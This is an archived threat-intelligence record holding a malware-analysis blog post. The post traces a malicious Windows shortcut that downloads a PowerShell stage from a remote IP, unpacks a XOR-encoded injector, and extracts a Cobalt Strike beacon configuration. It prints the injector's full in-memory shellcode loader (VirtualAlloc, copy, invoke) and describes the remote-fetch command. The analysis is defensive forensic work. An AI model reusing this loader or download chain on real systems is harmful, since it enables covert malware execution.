{
    "id": "dcc7253a-0d41-4326-ab95-18f52c9f30b7",
    "created_at": "2023-01-12T15:07:27.07318Z",
    "updated_at": "2025-03-27T02:09:18.166927Z",
    "deleted_at": null,
    "sha1_hash": "44e759f0f65be28e15eaf4a814a08669460f9ccb",
    "title": "2022-08-11 - LNK forensic and config extraction of a cobalt strike beacon",
    "authors": "",
    "file_creation_date": "2022-08-18T04:00:25Z",
    "file_modification_date": "2022-08-18T04:00:25Z",
    "file_size": 2167558,
    "plain_text": "# LNK forensic and config extraction of a cobalt strike beacon\n\n**[malcat.fr/blog/lnk-forensic-and-config-extraction-of-a-cobalt-strike-beacon/](https://malcat.fr/blog/lnk-forensic-and-config-extraction-of-a-cobalt-strike-beacon/)**\n\n**Sample:**\n\n[21286ed0b3e56f49c287617ee5bf4ef687c627e342d72297008e3fce73a5ae20.lnk (Bazaar,](https://bazaar.abuse.ch/sample/21286ed0b3e56f49c287617ee5bf4ef687c627e342d72297008e3fce73a5ae20/)\n[VT)](https://www.virustotal.com/gui/file/21286ed0b3e56f49c287617ee5bf4ef687c627e342d72297008e3fce73a5ae20)\n\n**Infection chain:**\n\n.lnk shortcut (downloader) -> Powershell packer -> Gzip archive -> Powershell injector ->\nCobalt Strike\n\n**Tools used:**\n\n[Malcat](https://malcat.fr/)\n\n**Difficulty:**\n\nVery easy\n\n## A suspicious link\n\n The downloader\n\n[The file we are about to dissect today is a .lnk shortcut found on MalwareBazaar. The](https://bazaar.abuse.ch/sample/21286ed0b3e56f49c287617ee5bf4ef687c627e342d72297008e3fce73a5ae20/)\nshortcut is a pretty straightforward powershell downloader, executing a remote powershell\nscript located at `hxxp://120.48.85.228:80/favicon .`\n\n\n-----\n\nFigure 1: The shortcut file and its execution\nAs a malware analyst, I would usually fetch the remote file and then move on to the next\nstage. But something was odd with this file. Usually, links to PE programs have their\n\"Relative Path\" string property set, at least that's what I am used to. But in this shortcut, the\nstring property is absent:\n\nFigure 2: Missing 'RelativePath' property\nChances are that the malicious link was not originally pointing to a PE program. The threat\nactor linked to another type of file, and then modified manually the link target to\n```\npowershell.exe when tailoring its attack. It's odd, thus interesting. People in DFIR are\n\n```\naware that windows shortcut files can actually provide much more information than what is\ndisplayed in the properties dialog. So let us dive a bit with Malcat and see if we can dig up\nsome extra information on this weird shortcut file.\n\n## Guessing the original linked file name\n\nThe first step would be to check online intelligence for the original submission name of the\nfile. Usually, the name of a .lnk file is the same as the name of the targeted file, only the\nextension differ (e.g `program.lnk points to` `program.exe ).`\n\n\n-----\n\nFigure 3: Submission name on VirusTotal\nIn VirusTotal, we can see that the file was submitted as 附件：安全自查工具.lnk which is\nChinese for: `Attachment:Security Self-Check Tool.lnk . This sounds more like a`\nclick-bait name than a standard file name. Chances are that the shortcut file name was\nmodified post-creation. We only learn that the targeted victim is most likely Chinesespeaking.\n\nLucky for us, most .lnk files have an `ExtraData section which is a collection of structures`\nstoring additional information about the linked file. These structures are filled during the\nshortcut creation, and are usually not updated when the file is modified using Window's\nproperties dialog. The one we are particularly interested in is the structure named\n```\nPropertyStoreDataBlock . In Malcat, switch to the structure view (F2 F2) and jump to\n\n```\noffset 0x540 (Ctrl+G, 0x540):\n\n\n-----\n\nFigure 4: PropetyStoreDataBlock structure in the ExtraData section\nAnd .. jackpot. We can see that the property `ParsingPath in one of the`\n```\nPropertyStorage structures holds what is most likely the original file path of the target of\n\n```\nthe shortcut. The .lnk files pointed to `E:\\downloads\\附件1：如何在个税APP上完成汇算清`\n\n缴？.pdf which is chinese for `E:\\downloads\\Attachment 1: How to complete the`\n```\nsettlement and payment on the IIT APP? .pdf (a chinese tax-related pdf). So mystery\n\n```\nsolved. The link was indeed pointing originally to a PDF document and was modified to point\nto powershell.exe afterwards. This explains the lack of `RelativePath String member in the`\nshortcut.\n\n## Getting to know the attacker\n\nKnowing the original file name of the link target is great for pivoting. But can we learn more\ninformation about the attacker?\nWell, the structure `PropertyStoreDataBlock gives us`\nthree more valuable informations about him:\n```\n   System.DateCreated : the linked file E:\\downloads\\Attachment 1: How to\n   complete the settlement and payment on the IIT APP? .pdf was most likely\n\n```\ndownloaded the 30th of June.\n```\n   System.ItemTypeText : this is the mime type of the linked program. Microsoft\n   Edge PDF Document tells us that PDF files were associated to the Edge browser on\n\n```\nthe attacker's computer. Which kind of madman does this? Well someone on a fresh\ncomputer who does not have another browser or adobe reader installed for instance.\n\n\n-----\n\n`FolderPath : the original file was downloaded into` `E:\\下载` ( E:\\downloads in\nChinese). So the user of the computer is also most likely Chinese-speaking.\n\nCan we go further? We Could inspect the `LinkInfo structure. It does indeed validates that`\nthe shortcut points to the program `powershell.exe . But it also contains a property named`\n```\nDriveSerialNumber which is pretty interesting for forensic investigations. It is the serial\n\n```\nnumber of the hard disk storing the linked program at the time of its last modification. So\nbasically, that's the serial number of the hard disk of the threat actor.\n\nFigure 5: The LinkInfo structure\nAnd if you think that having the drive serial number is neat, what until you see the\n```\nTrackerDataBlock structure. It contains the computer name of the attacker's computer\n\n```\n( desktop-31400cr ) and two very interesting structure members: `Droid and`\n```\nDroidBirth . DROID stands for Digital Record Object Identification and uniquely identifies\n\n```\na file. These identifiers are made of a pair of two GUIDs. And very interestingly, the last 8\ndigit numbers of the second GUIDs are actually the attacker's MAC address.\n\nFigure 6: The TrackerDataBlock structure\nA quick google lookup tells us that `00:50:56:C0:00:08 is associated to vmware network`\ninterfaces.\n\nSo in a few minutes, we've learned a lot of information:\n\nThe attacker is most likely Chinese-speaking and targets a Chinese-speaking victim\nThe attacker's is using a Vmware virtual named `desktop-31400cr and its mac`\naddress is `00:50:56:C0:00:08`\nOn the 30th of June 2022, the attacker downloaded a file named `Attachment 1: How`\n```\n   to complete the settlement and payment on the IIT APP? .pdf using his\n\n```\nEdge browser\nThe attacker then changed the link target (most likely manually using Window's\nproperties dialog) to `powershell.exe -nop -w hidden ...`\n\n\n-----\n\nThe attacker changed the link name to `Attachment:Security Self-Check`\n\n```\nTool.lnk\n\n```\n\nIn conclusion, never underestimate a Windows shortcut file. Now let use have a look at the\nnext stage of the attack.\n\n## Second stage: powershell packer + injector\n\n The packer\n\nThe file downloaded by the powershell command is located at\n```\nhxxp://120.48.85.228:80/favicon . It is a 190KB powershell script of sha256\n\n```\n`4109d17d439e425d24e9d11956adcc63ff8e24ccfffe21dd8c5431fe969d2783` [(Bazaar,](https://bazaar.abuse.ch/sample/4109d17d439e425d24e9d11956adcc63ff8e24ccfffe21dd8c5431fe969d2783/)\n[VT).](https://www.virustotal.com/gui/file/4109d17d439e425d24e9d11956adcc63ff8e24ccfffe21dd8c5431fe969d2783)\n\nFigure 7: Unpacking the payload string\nThe script is composed at 99% of a base64-encoded string. So let use Malcat's transform on\nthis string (select the string and then Ctrl+T) and chose base64 decode -> New file. The\ndecoded string appears to be a GZip archive. Double click on packed content in Malcat's\nVirtual File System tab and you will display the unpacked gzip archive.\n\n\n-----\n\n## The injector\n\nThe file inside the GZip archive is a 275Kb ps1 script of sha256\n```\nb154b7681167bd4a61c54b543126f31d0ecca4c71846d5fe35a677c908fae3d1 . It contains\n\n```\na huge base64 payload stored in the powershell variable `$var_code . The script itself is a`\nsimple injector performing the following steps:\n\nBase64-decode content of `$var_code ( [System.Convert]::FromBase64String )`\nXor the decoded content using the value 35 as key ( $var_code[$x] =\n```\n   $var_code[$x] -bxor 35 )\n\n```\nObtain the address of the api VirtualAlloc\nAllocate enough space for the decrypted content using VirtualAlloc\nCopy the decrypted bytes to the allocated buffer\nRun the assembly (i.e. the PE file) loaded at this address\n( $var_runme.Invoke([IntPtr]::Zero) )\n\nThe full code of the script is given below:\n\n\n-----\n\n```\nSet StrictMode Version 2\n\nfunction func_get_proc_address {\n\n  Param ($var_module, $var_procedure)  \n\n  $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | WhereObject { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll')\n}).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\n  $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]]\n@('System.Runtime.InteropServices.HandleRef', 'string'))\n\n  return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](NewObject System.Runtime.InteropServices.HandleRef((New-Object IntPtr),\n($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null,\n@($var_module)))), $var_procedure))\n\n}\n\nfunction func_get_delegate_type {\n\n  Param (\n\n    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n\n    [Parameter(Position = 1)] [Type] $var_return_type = [Void]\n\n  )\n\n  $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object\nSystem.Reflection.AssemblyName('ReflectedDelegate')),\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModu\n $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',\n[System.MulticastDelegate])\n\n  $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public',\n[System.Reflection.CallingConventions]::Standard,\n$var_parameters).SetImplementationFlags('Runtime, Managed')\n\n  $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',\n$var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\n  return $var_type_builder.CreateType()\n\n}\n\n[Byte[]]$var_code = [System.Convert]::FromBase64String('<redacted>')\n\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n\n  $var_code[$x] = $var_code[$x] -bxor 35\n\n}\n\n$var_va =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc\n kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32],\n[UInt32]) ([IntPtr])))\n\n$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer,\n$var_code.length)\n\n$var_runme =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer,\n\n```\n\n-----\n\n```\n(func_get_delegate_type @([IntPtr]) ([Void])))\n\n$var_runme.Invoke([IntPtr]::Zero)\n\n```\nNothing fancy there. Decrypting the payload using Malcat is a piece of cake:\n\nIn Data view, select the base64 string\nTransform (Ctrl+T) the selection: base64 decode -> new file\nSelect all bytes of the new file (Ctrl+A)\nTransform (Ctrl+T) the selection: xor decode (35) -> new file\n\nFigure 8: Decrypting the injector's payload\nLet us have a look at the decrypted PE file.\n\n## Third stage: Cobalt Strike beacon\n\nWhat we are looking at now is a 205KB PE file of sha256\n\n`bb26724c27361a5881ebf646166423b9668fd4089cf50e4e493641d471d30fa9` [(VT). Since](https://www.virustotal.com/gui/file/bb26724c27361a5881ebf646166423b9668fd4089cf50e4e493641d471d30fa9)\nthe file is pretty small and not obfuscated, we are most likely facing the last stage of the\ninfection chain. So first thing first, let us have a look at the summary view (F1) in Malcat:\n\n\n-----\n\nFigure 9: Third stage\nBy just looking at the summary, we can infer that:\n\nThe file is not packed (low entropy overall)\nThe export name ( beacon.dll ) is pretty interesting\nIt seems to be able to download stuff\nIt seems to be able to decrypt stuff.\n\nA first wild guess would be that it's a Cobalt Strike or meterpreter beacon. A quick look at the\nthreat intelligence report (Ctrl+I) confirms that we are indeed looking at a Cobalt Strike\nbeacon:\n\nFigure 10: Querying threat intelligence\n\n\n-----\n\nCobalt Strike is a red team penetration test tool which is also used a lot by threat actors. We\nwon't analyze it in details since a lot of in-depth analyses can already be found online:\n\n[https://www.mandiant.com/resources/defining-cobalt-strike-components](https://www.mandiant.com/resources/defining-cobalt-strike-components)\n[https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/](https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/)\nhttps://blog.talosintelligence.com/2020/09/coverage-strikes-back-cobalt-strikepaper.html\n[https://go.recordedfuture.com/hubfs/reports/mtp-2021-0914.pdf](https://go.recordedfuture.com/hubfs/reports/mtp-2021-0914.pdf)\n\nBut what we will do is extract the configuration data from the beacon program. Cobalt Strike\nis a very flexible piece of software driven by its configuration file. This configuration comes as\na serialized structure stored inside the .data section of the beacon. So let us try to extract it\nusing existing tools.\n\n## When tools fail\n\nCobalt Strike is pretty old and widespread, so it should not be a surprise that many tools\n[have been designed for it. We will first use SentinelOne's CobalStrikeParser to extract the](https://github.com/Sentinel-One/CobaltStrikeParser)\nconfiguration from the third-stage beacon.\n```\n  malcat@XPS:~/malware/bazaar/cobalt$ python parse_beacon_config.py\n  ./beacon\n\n  [-] Failed to find any beacon configuration\n\n\n```\n[No luck this time. We could also try a more up-to-date tool, Didier Steven's 1768.py, which](https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py)\nseems to support a broader variety of beacons:\n\n|Col1|malcat@XPS:~/malware/bazaar/cobalt$ python parse_beacon_config.py ./beacon [-] Failed to find any beacon configuration|\n|---|---|\n\n\n-----\n\n```\nmalcat@XPS:~/malware/bazaar/cobalt$ python 1768.py\n./beacon\n\nFile: ./beacon\n\npayloadType: 0x10014fc2\n\npayloadSize: 0x00000000\n\nintxorkey: 0x00000000\n\nid2: 0x00000000\n\nSkipping 32 bytes\n\npayloadType: 0x00000003\n\npayloadSize: 0x00000002\n\nintxorkey: 0x00000004\n\nid2: 0x00000018\n\nMZ header not found, truncated dump:\n\n00000000: 01 00\n\n```\n\nAgain, no luck on this sample. Somehow, it could not infer the encryption key of the\nconfiguration structure. Our last shot is to try to locate and decrypt the structure manually. By\nchance, Malcat embeds a Cobalt Strike config parser. So after decryption, the structure will\nbe automatically parsed.\n\n## Manually extracting the configuration\n\nIn order to locate the config, we could reverse engineer the code of the program. But that\nwould take time, so let us focus on the data instead. We know that Cobalt Strike sotres its\nconfiguration in the `.data section. This section is relatively small (~ 8KB on disk) so it`\nshould be easy to spot. We should look for:\n\nAn encrypted block of data of a few hundred bytes\nWith a code reference decrypting it\n\n\n-----\n\nThat starts with `00 01 00 01 00 02 00 when decrypted (that is the serialized form`\nof the `BeaconType config value, all configs start with this)`\n\nWe don't have to look for long to find our first candidate at address `0x10032020 . This check`\nall the boxes:\n\nFigure 11: Start candidate of encrypted config\nIn order to validate our assumption, let's decrypt this configuration:\n\nSelect 0x1000 bytes starting from address `0x10032020`\nTransform (Ctrl+T) the selection using a xor 0xe9 in a new file\nMalcat opens the result and identifies it as a Cobal Strike configuration\n\nYou can see these three steps in action below:\n\nFigure 12: Decrypting the config config\nThis was pretty easy! We now have access to all the information we need. Now regarding the\n[causes that lead the existing tools to fail, it looks like SentinelOne's CobalStrikeParser did](https://github.com/Sentinel-One/CobaltStrikeParser)\nnot have the correct XOR key (0xe9) listed in its keys list:\n\n\n-----\n\n```\nXORBYTE\nS = {\n\n  3:\n0x69,\n\n  4:\n0x2e\n\n}\n\n```\n\nI don't know if it is because this beacon is newer, or if the attacker modified the key himself.\nAt the end, relying on automatic tools only gets you so far.\n\n## Conclusion\n\nToday we have seen how much information a simple .lnk shortcut can store and how they\nshould not be overlooked for threat hunting. Luckily Malcat's .lnk parser is pretty thorough\nand can show most of the hidden gems of such files. Afterwards, we did see how to statically\ndecrypt and extract the configuration structure of a Cobalt Strike beacon using Malcat's\ntransforms. When all tools fail, there is always the good old hexadecimal editor.\n\nI hope that you enjoyed this small forensic/unpacking session, more oriented towards\nbeginners this time. As usual, feel free to share with us your remarks or suggestions!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-11 - LNK forensic and config extraction of a cobalt strike beacon.pdf"
    ],
    "report_names": [
        "2022-08-11 - LNK forensic and config extraction of a cobalt strike beacon.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536047,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1660795225,
    "ts_modification_date": 1660795225,
    "files": {
        "pdf": "https://archive.orkl.eu/44e759f0f65be28e15eaf4a814a08669460f9ccb.pdf",
        "text": "https://archive.orkl.eu/44e759f0f65be28e15eaf4a814a08669460f9ccb.txt",
        "img": "https://archive.orkl.eu/44e759f0f65be28e15eaf4a814a08669460f9ccb.jpg"
    }
}